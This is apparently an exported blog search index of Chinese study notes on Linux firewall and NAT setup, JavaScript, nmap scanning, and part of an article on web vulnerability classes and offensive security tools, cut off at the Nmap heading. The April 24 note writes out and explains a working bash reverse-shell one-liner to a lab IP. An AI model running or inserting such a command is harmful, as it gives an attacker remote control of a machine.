<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>424</title>
      <link href="/2023/04/24/0424/"/>
      <url>/2023/04/24/0424/</url>
      
        <content type="html"><![CDATA[<h1 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h1><p>&amp; 和||前后的命令无论真假都全部执行<br>&amp;&amp;和|前命令为真，后命令才执行</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><code>bash -i &gt;&amp; /dev/tcp/192.168.10.136/5555 0&gt;&amp;1</code>  这段代码是一个bash命令，用于在一个交互式的shell中执行命令。</p><ol><li><p><code>bash -i</code> 启动一个交互式的shell，即可以接受用户输入的shell</p></li><li><p><code>&gt;&amp; /dev/tcp/192.168.10.136/5555</code>：将标准输出和标准错误重定向到一个TCP连接，连接的目标地址是192.168.10.136，端口号是5555。这意味着shell中执行的任何命令的输出都会发送到这个地址。</p></li><li><p><code>0&gt;&amp;1</code> 将标准输入重定向到标准输出，即从TCP连接中读取输入。这意味着shell可以接受从这个地址发送过来的命令。</p></li></ol><p>综上，这段代码的作用是创建一个反向shell，即在目标机器上运行一个shell，然后通过网络连接将其控制权交给攻击者。这是一种常见的渗透测试和黑客攻击的技术，可以让攻击者在目标机器上执行任意命令。</p><p>&amp;&gt;和&gt;&amp;含义相同都是：都是将标准错误输出和标准输出重定向</p><h1 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h1><p>格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读&#x2F;写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>329</title>
      <link href="/2023/03/29/0329/"/>
      <url>/2023/03/29/0329/</url>
      
        <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>普通用户密钥登录放在普通用户的目录里面</p><h1 id="内网主机通过防火墙转发借助可以访问外网的内网主机访问外网"><a href="#内网主机通过防火墙转发借助可以访问外网的内网主机访问外网" class="headerlink" title="内网主机通过防火墙转发借助可以访问外网的内网主机访问外网"></a>内网主机通过防火墙转发借助可以访问外网的内网主机访问外网</h1><p>两台VMware虚拟机，都是centos7.6。</p><p>外网主机ip:192.168.80.10,192.168.10.138</p><p>内网主机ip:192.168.10.140</p><ol><li><h5 id="在带外网的机器上设置iptables规则或者firewall-cmd规则："><a href="#在带外网的机器上设置iptables规则或者firewall-cmd规则：" class="headerlink" title="在带外网的机器上设置iptables规则或者firewall-cmd规则："></a>在带外网的机器上设置iptables规则或者firewall-cmd规则：</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s <span class="token number">192.168</span>.10.140 -j SNAT --to <span class="token number">192.168</span>.80.10  <span class="token comment"># iptables</span>firewall-cmd  --permanent --direct --passthrough ipv4 -t nat -A POSTROUTING -s <span class="token number">192.168</span>.10.140 -j SNAT --to-source <span class="token number">192.168</span>.80.50  <span class="token comment">#firewall-cmd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h5 id="在带带外网机器上打开转发"><a href="#在带带外网机器上打开转发" class="headerlink" title="在带带外网机器上打开转发"></a>在带带外网机器上打开转发</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> net.ipv4.ip_forward<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">>></span> /etc/sysctl.confsysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h5 id="在内网机器上，设置其网关为-192-168-10-138"><a href="#在内网机器上，设置其网关为-192-168-10-138" class="headerlink" title="在内网机器上，设置其网关为 192.168.10.138"></a>在内网机器上，设置其网关为 192.168.10.138</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">route <span class="token function">add</span> default gw <span class="token number">192.168</span>.10.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>327</title>
      <link href="/2023/03/27/0327/"/>
      <url>/2023/03/27/0327/</url>
      
        <content type="html"><![CDATA[<h1 id="window-网络配置"><a href="#window-网络配置" class="headerlink" title="window 网络配置"></a>window 网络配置</h1><ul><li>网关“在链路上”<br>表示直接发送给目标，而不需要经过路由器（指路由表的网关IP和IF参数对应的接口的IP是一样的）</li></ul><h1 id="javascript-函数表达式"><a href="#javascript-函数表达式" class="headerlink" title="javascript 函数表达式"></a>javascript 函数表达式</h1><p>使用函数表达式，并将 <code>welcome</code> 赋值给在 <code>if</code> 外声明的变量，并具有正确的可见性。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">"What is your age?"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">let</span> welcome<span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>age <span class="token operator">&lt;</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token function-variable function">welcome</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token function-variable function">welcome</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Greetings!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 现在可以了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>函数是值。它们可以在代码的任何地方被分配，复制或声明。</li><li>如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。</li><li>如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。</li><li>在执行代码块之前，内部算法会先处理函数声明。所以函数声明在其被声明的代码块内的任何位置都是可见的。</li><li>函数表达式在执行流程到达时创建。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>321</title>
      <link href="/2023/03/21/0321/"/>
      <url>/2023/03/21/0321/</url>
      
        <content type="html"><![CDATA[<h1 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h1><h4 id="查看服务的状态"><a href="#查看服务的状态" class="headerlink" title="查看服务的状态"></a>查看服务的状态</h4><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="永久配置存储位置"><a href="#永久配置存储位置" class="headerlink" title="永久配置存储位置"></a>永久配置存储位置</h4><pre class="line-numbers language-none"><code class="language-none">firewall的每个区域的永久配置存储在&#x2F;usr&#x2F;lib&#x2F;firewalld&#x2F;zones&#x2F; 目录中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使新设置持久"><a href="#使新设置持久" class="headerlink" title="使新设置持久"></a>使新设置持久</h4><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="添加新端口"><a href="#添加新端口" class="headerlink" title="添加新端口"></a>添加新端口</h4><p>通过打开端口，系统可从外部访问，这代表了安全风险。通常，让端口保持关闭，且只在某些服务需要时才打开。</p><h5 id="1-列出所有允许的端口："><a href="#1-列出所有允许的端口：" class="headerlink" title="1.列出所有允许的端口："></a>1.列出所有允许的端口：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-在允许的端口中添加一个端口，以便为入站流量打开这个端口："><a href="#2-在允许的端口中添加一个端口，以便为入站流量打开这个端口：" class="headerlink" title="2.在允许的端口中添加一个端口，以便为入站流量打开这个端口："></a>2.在允许的端口中添加一个端口，以便为入站流量打开这个端口：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --add-port&#x3D;port-number&#x2F;port-type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>端口类型为 tcp、udp、sctp 或 dccp。这个类型必须与网络通信的类型匹配。</p><h5 id="3-使新设置具有持久性"><a href="#3-使新设置具有持久性" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>端口类型为 tcp、udp、sctp 或 dccp。这个类型必须与网络通信的类型匹配。</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><h5 id="1-列出要关闭的端口情况"><a href="#1-列出要关闭的端口情况" class="headerlink" title="1.列出要关闭的端口情况"></a>1.列出要关闭的端口情况</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-从允许的端口中删除端口，以便对传入的流量关闭"><a href="#2-从允许的端口中删除端口，以便对传入的流量关闭" class="headerlink" title="2.从允许的端口中删除端口，以便对传入的流量关闭"></a>2.从允许的端口中删除端口，以便对传入的流量关闭</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --remove-port&#x3D;port-number&#x2F;port-type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-使新设置具有持久性-1"><a href="#3-使新设置具有持久性-1" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列出区域"><a href="#列出区域" class="headerlink" title="列出区域"></a>列出区域</h4><h5 id="1-查看系统中有哪些可用区："><a href="#1-查看系统中有哪些可用区：" class="headerlink" title="1.查看系统中有哪些可用区："></a>1.查看系统中有哪些可用区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>firewall-cmd –get-zones 命令显示系统上所有可用的区，但不显示特定区的详情。</p><h5 id="2-查看所有区的详细信息："><a href="#2-查看所有区的详细信息：" class="headerlink" title="2.查看所有区的详细信息："></a>2.查看所有区的详细信息：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-查看特定区的详细信息："><a href="#3-查看特定区的详细信息：" class="headerlink" title="3.查看特定区的详细信息："></a>3.查看特定区的详细信息：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone-name --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更改特定区的-firewalld-设置"><a href="#更改特定区的-firewalld-设置" class="headerlink" title="更改特定区的 firewalld 设置"></a>更改特定区的 firewalld 设置</h4><p>要在其他区域中工作，请使用 <code>--zone=*zone-name*</code> 选项。例如，要允许在区 <em>public</em> 中使用 <code>SSH</code> 服务：</p><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --add-service&#x3D;ssh --zone&#x3D;public<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更改默认区"><a href="#更改默认区" class="headerlink" title="更改默认区"></a>更改默认区</h4><h5 id="1-显示当前的默认区："><a href="#1-显示当前的默认区：" class="headerlink" title="1.显示当前的默认区："></a>1.显示当前的默认区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-default-zone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-设置新的默认区："><a href="#2-设置新的默认区：" class="headerlink" title="2.设置新的默认区："></a>2.设置新的默认区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --set-default-zone zone-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="将区分配给特定的接口"><a href="#将区分配给特定的接口" class="headerlink" title="将区分配给特定的接口"></a>将区分配给特定的接口</h4><h5 id="1-列出活跃区以及分配给它们的接口"><a href="#1-列出活跃区以及分配给它们的接口" class="headerlink" title="1.列出活跃区以及分配给它们的接口"></a>1.列出活跃区以及分配给它们的接口</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-active-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-为不同的区分配接口"><a href="#2-为不同的区分配接口" class="headerlink" title="2.为不同的区分配接口"></a>2.为不同的区分配接口</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone_name --change-interface&#x3D;interface_name --permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="在-ifcfg-文件中手动将区分配给网络连接"><a href="#在-ifcfg-文件中手动将区分配给网络连接" class="headerlink" title="在 ifcfg 文件中手动将区分配给网络连接"></a>在 ifcfg 文件中手动将区分配给网络连接</h4><p>当连接由 <strong>NetworkManager</strong> 管理时，必须了解它使用的区。为每个网络连接指定区域，根据计算机有可移植设备的位置提供各种防火墙设置的灵活性。因此，可以为不同的位置（如公司或家）指定区域和设置。要为连接设置一个区，请编辑 <code>/etc/sysconfig/network-scripts/ifcfg-*connection_name*</code> 文件，并添加将区分配给这个连接的行：</p><pre class="line-numbers language-none"><code class="language-none">ZONE&#x3D;zone_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="创建一个新区"><a href="#创建一个新区" class="headerlink" title="创建一个新区"></a>创建一个新区</h4><h5 id="1-创建一个新区"><a href="#1-创建一个新区" class="headerlink" title="1.创建一个新区"></a>1.创建一个新区</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --permanent --new-zone&#x3D;zone-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-检查是否在您的永久设置中添加了新的区："><a href="#2-检查是否在您的永久设置中添加了新的区：" class="headerlink" title="2.检查是否在您的永久设置中添加了新的区："></a>2.检查是否在您的永久设置中添加了新的区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-使新设置具有持久性-2"><a href="#3-使新设置具有持久性-2" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用区目标设定传入流量的默认行为"><a href="#使用区目标设定传入流量的默认行为" class="headerlink" title="使用区目标设定传入流量的默认行为"></a>使用区目标设定传入流量的默认行为</h4><p>对于每个区，您可以设置一种处理尚未进一步指定的传入流量的默认行为。此行为是通过设置区的目标来定义的。有四个选项：</p><ul><li><code>ACCEPT</code> ：接受所有传入的数据包，除了特定规则禁止的。</li><li><code>REJECT</code> ：拒绝所有传入的数据包，除了特定规则允许的。当 <code>firewalld</code> 拒绝数据包时，会告知源机器有关拒绝的信息。</li><li><code>DROP</code> ：丢弃所有传入的数据包，除了特定规则允许的。当 <code>firewalld</code> 丢弃数据包时，不会告知源机器有关丢弃数据包的信息。</li><li><code>default</code> ：与 <code>REJECT</code> 的行为类似，但在某些情况下具有特殊含义。详情请查看 <code>firewall-cmd(1)</code> 手册页中的 <code>适应和查询区和策略的选项</code> 部分。</li></ul><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>为区设置目标：</p><ol><li><h5 id="列出特定区的信息以查看默认目标："><a href="#列出特定区的信息以查看默认目标：" class="headerlink" title="列出特定区的信息以查看默认目标："></a>列出特定区的信息以查看默认目标：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone-name --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="在区中设置一个新目标："><a href="#在区中设置一个新目标：" class="headerlink" title="在区中设置一个新目标："></a>在区中设置一个新目标：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --permanent --zone&#x3D;zone-name --set-target&#x3D;&lt;default|ACCEPT|REJECT|DROP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>313</title>
      <link href="/2023/03/13/0313/"/>
      <url>/2023/03/13/0313/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap-快速端口扫描"><a href="#nmap-快速端口扫描" class="headerlink" title="nmap 快速端口扫描"></a>nmap 快速端口扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v -p1-65535 -oG result.txt -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；<br>-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；<br>-n： 功能未知；<br>–open： 只输出检测状态为open的端口，即开放的端口；<br>–min-hostgroup 4：调整并行扫描组的大小；<br>–min-parallelism 1024：调整探测报文的并行度；<br>–host-timeout 30：检测超时的跳过<br>-T4：总共有T0-T5，貌似T4比较折中<br>-v：打印详细扫描过程<br>-oG：输出为比较人性化的格式，一条记录一行，后期好处理<br>-iL：载入ip段文件，批量扫，不用一条条执行了。<br>-p 端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>310</title>
      <link href="/2023/03/10/0310/"/>
      <url>/2023/03/10/0310/</url>
      
        <content type="html"><![CDATA[<blockquote><p>secpol.msc  “本地安全策略编辑器”</p></blockquote><blockquote><p>lsass.exe “Local Security Authority Service本地安全权限服务”</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230307</title>
      <link href="/2023/03/07/20230307/"/>
      <url>/2023/03/07/20230307/</url>
      
        <content type="html"><![CDATA[<blockquote><p>方括号中的字符串要放在引号中，单引号或双引号都可以。没有引号就是在访问变量 </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230303</title>
      <link href="/2023/03/03/20230303/"/>
      <url>/2023/03/03/20230303/</url>
      
        <content type="html"><![CDATA[<h1 id="excel-按ip排序"><a href="#excel-按ip排序" class="headerlink" title="excel 按ip排序"></a>excel 按ip排序</h1><h2 id="excel方式"><a href="#excel方式" class="headerlink" title="excel方式"></a>excel方式</h2><pre class="line-numbers language-none"><code class="language-none">&#x3D;SUMPRODUCT(MID(SUBSTITUTE(B2,&quot;.&quot;,REPT(&quot; &quot;,20)),&#123;1,21,41,61&#125;,20)*10^&#123;9,6,3,0&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>选中一个空的单元格</li><li>粘贴函数，函数中的A1代表IP地址的列，根据实际表格修改。</li></ol><h2 id="sort命令方式"><a href="#sort命令方式" class="headerlink" title="sort命令方式"></a>sort命令方式</h2><p><code>sort  -t &quot;.&quot; -k1n,1 -k2n,2 -k3n,3 -k4n,4 ip.txt</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实战化白帽人才能力各项技能详解</title>
      <link href="/2022/11/08/shi-zhan-hua-bai-mao-ren-cai-neng-li-ge-xiang-ji-neng-xiang-jie/"/>
      <url>/2022/11/08/shi-zhan-hua-bai-mao-ren-cai-neng-li-ge-xiang-ji-neng-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="实战化白帽人才能力各项技能详解"><a href="#实战化白帽人才能力各项技能详解" class="headerlink" title="实战化白帽人才能力各项技能详解"></a>实战化白帽人才能力各项技能详解</h1><h2 id="一、-基础能力"><a href="#一、-基础能力" class="headerlink" title="一、  基础能力"></a>一、  基础能力</h2><p>基础能力是比较初级的实战化白帽能力，学习和掌握相对容易，通常也是其他各类高级实战化技能学习和实践的基础能力。基础能力主要包括Web漏洞利用与基础安全工具使用两类。</p><h3 id="（一）-Web漏洞利用"><a href="#（一）-Web漏洞利用" class="headerlink" title="（一） Web漏洞利用"></a>（一） Web漏洞利用</h3><p>Web漏洞利用能力是指利用Web系统或软件的安全漏洞实施网络攻击的能力。</p><p>由于Web系统是绝大多数机构业务系统或对外服务系统的构建形式，所以Web漏洞利用也是最常见，最基础的网络攻击形式之一。在实战攻防演习中，白帽子最为经常利用的Web漏洞形式包括：命令执行、SQL注入、代码执行、逻辑漏洞、解析漏洞、信息泄露、XSS、配置错误、弱口令、反序列化、文件上传、权限绕过等。</p><h4 id="1）-命令执行"><a href="#1）-命令执行" class="headerlink" title="(1） 命令执行"></a>(1） 命令执行</h4><p>命令执行漏洞，是指黑客可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下Shell权限的安全漏洞。造成命令执行漏洞最常见的原因是Web服务器对用户输入命令的安全检测不足，导致恶意代码被执行。命令执行漏洞常常发生在各种Web组件上，包括Web容器、Web框架、CMS软件、安全组件等。</p><h4 id="2）-SQL注入"><a href="#2）-SQL注入" class="headerlink" title="(2） SQL注入"></a>(2） SQL注入</h4><p>SQL，是Structured Query Language的缩写，意为结构化查询语言。SQL注入漏洞，是最常见的安全漏洞形式之一，是指通过构造特定的SQL语句，可以实现对数据库服务器的非授权查询，进而造成数据库数据泄露的安全漏洞。SQL注入漏洞产生的主要原因是软件系统对输入数据的合法性缺少校验或过滤不严。</p><h4 id="3）-代码执行"><a href="#3）-代码执行" class="headerlink" title="(3） 代码执行"></a>(3） 代码执行</h4><p>代码执行漏洞，是指通过构造特殊的语句或数据，使软件可以在设计流程之外，执行特定函数或命令的安全漏洞。造成代码执行漏洞的主要原因是，开发人员在编写代码时，没有充分校验输入数据的合法性。</p><h4 id="4）-逻辑漏洞"><a href="#4）-逻辑漏洞" class="headerlink" title="(4） 逻辑漏洞"></a>(4） 逻辑漏洞</h4><p>逻辑漏洞，是指由于程序设计逻辑不够严谨，导致一些逻辑分支处理错误，或部分流程被绕过，进而引发安全风险的安全漏洞。</p><h4 id="5）-解析漏洞"><a href="#5）-解析漏洞" class="headerlink" title="(5） 解析漏洞"></a>(5） 解析漏洞</h4><p>解析漏洞，是指服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站沦陷的漏洞。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。此类漏洞中具有代表性的便是IIS6.0解析漏洞，此漏洞又有目录解析和文件解析两种利用方式，但也有少部分是由于配置的疏忽所产生的。</p><h4 id="6）-信息泄露"><a href="#6）-信息泄露" class="headerlink" title="(6） 信息泄露"></a>(6） 信息泄露</h4><p>信息泄露漏洞，是指造成系统或服务器中，本应被保护或不可见的敏感信息被意外泄露的安全漏洞。这些信息包括账号密码、系统配置、运行状态、关键参数、敏感文件内容等。造成信息泄露漏洞的主要原因包括运维操作不当、系统代码不严谨等。</p><h4 id="7）-XSS"><a href="#7）-XSS" class="headerlink" title="(7） XSS"></a>(7） XSS</h4><p>XSS，全称为Cross Site Scripting，意为跨站脚本攻击，为了和更加常用的CSS（Cascading Style Sheets，层叠样式表）有所区分，特别简写为XSS。</p><p>XSS攻击，通常是指通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、VBScript、ActiveX、Flash或某些普通的HTML等。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密的网页内容、会话信息和Cookie等各种用户敏感信息。</p><p>最早期的XSS攻击示例大多使用了跨站方法，即：用户在浏览A网站时，攻击者却可以通过页面上的恶意代码，访问用户浏览器中的B网站资源（如Cookie等），从而达到攻击目的。但随着浏览器安全技术的进步，早期的跨站方法已经很难奏效，XSS攻击也逐渐和“跨站”的概念没有了必然的联系。只不过由于历史习惯，XSS这个名字一直被延用了下来，现如今用来泛指通过篡改页面，使浏览器加载恶意代码的一种攻击方法。</p><p>在本文中，白帽子的XSS能力，是指白帽子能够发现软件或系统的设计缺陷或安全漏洞，构造XSS攻击代码，实现网络攻击的技术能力。</p><h4 id="8）-配置错误"><a href="#8）-配置错误" class="headerlink" title="(8） 配置错误"></a>(8） 配置错误</h4><p>配置错误，是指由软件或系统的配置不当导致安全风险的安全漏洞。例如，文件的或服务的访问权限、可见范围配置不当，网络安全规则的设置错误等，都有可能使系统处于暴露或风险之中。配置错误的本质是系统的使用或运维不当，而不是系统的设计或开发问题。造成配置错误的主要原因是运维人员的疏忽或专业技能不足。</p><h4 id="9）-弱口令"><a href="#9）-弱口令" class="headerlink" title="(9） 弱口令"></a>(9） 弱口令</h4><p>弱口令也是安全漏洞的一种，是指系统登录口令的设置强度不高，容易被攻击者猜到或破解。造成弱口令的主要原因是系统的运维人员、管理人员安全意识不足。常见的弱口令形式包括：系统出厂默认口令没有修改；密码设置过于简单，如口令长度不足，单一使用字母或数字；使用了生日、姓名、电话号码、身份证号码等比较容易被攻击者猜到的信息设置口令；设置的口令属于流行口令库中的流行口令。</p><h4 id="10）-反序列化"><a href="#10）-反序列化" class="headerlink" title="(10）  反序列化"></a>(10）  反序列化</h4><p>反序列化漏洞，是指反序列化过程可以被操控或篡改，进而引发恶意代码执行风险的安全漏洞。</p><p>序列化和反序列化都是基础的计算机技术。序列化就是把计算机中的“对象”转换成字节流，以便于存储的一种方法。反序列化是序列化的逆过程，即将字节流还原成“对象”。</p><p>在反序列化过程中，如果输入的字节流可以被控制或篡改，就有可能产生非预期的“对象”。这就是反序列化漏洞。此时，攻击者通过构造恶意字节流输入，就可以在反序列化过程中，在对象被还原的过程中，使系统执行恶意代码。</p><h4 id="11）-文件上传"><a href="#11）-文件上传" class="headerlink" title="(11）  文件上传"></a>(11）  文件上传</h4><p>文件上传漏洞，是指可以越权或非法上传文件的安全漏洞。攻击者可以利用文件上传漏洞将恶意代码秘密植入到服务器中，之后再通过远程访问去执行恶意代码，达到攻击的目的。</p><h4 id="12）-权限绕过"><a href="#12）-权限绕过" class="headerlink" title="(12）  权限绕过"></a>(12）  权限绕过</h4><p>权限绕过漏洞，是指可以绕过系统的权限设置或权限管理规则执行非法操作的安全漏洞。造成权限绕过漏洞的主要原因是，软件或系统的开发人员对数据处理权限的设计或判定不严谨、不全面。</p><h3 id="（二）-基础安全工具"><a href="#（二）-基础安全工具" class="headerlink" title="（二） 基础安全工具"></a>（二） 基础安全工具</h3><p>基础安全工具是指安全分析或攻防实战过程中，经常使用到的一些初级的、基础的软件工具。比较常见的基础安全工具包括：Burp Suite、Sqlmap、AppScan、AWVS、Nmap、Wireshark、MSF、Cobalt Strike等。</p><h4 id="1）-Burp-Suite"><a href="#1）-Burp-Suite" class="headerlink" title="(1） Burp Suite"></a>(1） Burp Suite</h4><p>Burp Suite是一个常用的Web攻击工具的集合平台，经常被安全工作者用来测试Web系统安全性，也是实战攻防演习中攻击队的常用平台。</p><p>使用者通过平台集成的工具，既可以对目标发起手动攻击，也可以自定义规则发起自动攻击；既可以探测和分析目标漏洞，也可以使用爬虫抓取和搜索页面内容。</p><h4 id="2）-Sqlmap"><a href="#2）-Sqlmap" class="headerlink" title="(2） Sqlmap"></a>(2） Sqlmap</h4><p>Sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测。Sqlmap可以利用常见的SQL注入漏洞，获取数据库服务器的权限。Sqlmap还具有功能比较强大的检测引擎,可提供针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。</p><h4 id="3）-AppScan"><a href="#3）-AppScan" class="headerlink" title="(3） AppScan"></a>(3） AppScan</h4><p>AppScan 是IBM 公司推出的一款Web 应用安全测试工具，采用黑盒测试的方式，可以扫描常见的Web用安全漏洞。AppScan功能比较齐全，支持登录、报表等功能。在扫描结果中，不仅能够看到Web应用被扫出的安全漏洞，还提供了详尽的漏洞原理、修改建议、手动验证等功能。</p><p>在实战攻防演习中，AppScan是一个很方便的漏洞扫描器。</p><h4 id="4）-AWVS"><a href="#4）-AWVS" class="headerlink" title="(4） AWVS"></a>(4） AWVS</h4><p>AWVS是Acunetix Web Vulnerability Scanner的缩写。它是一个自动化的Web应用程序安全测试工具，可以审计和检查Web漏洞。AWVS可以扫描任何可通过Web浏览器访问的和遵循HTTP&#x2F;HTTPS规则的Web站点和Web应用程序。可以通过检查SQL注入攻击漏洞、XSS漏洞等来审核Web应用程序的安全性。</p><h4 id="5）-Nmap"><a href="#5）-Nmap" 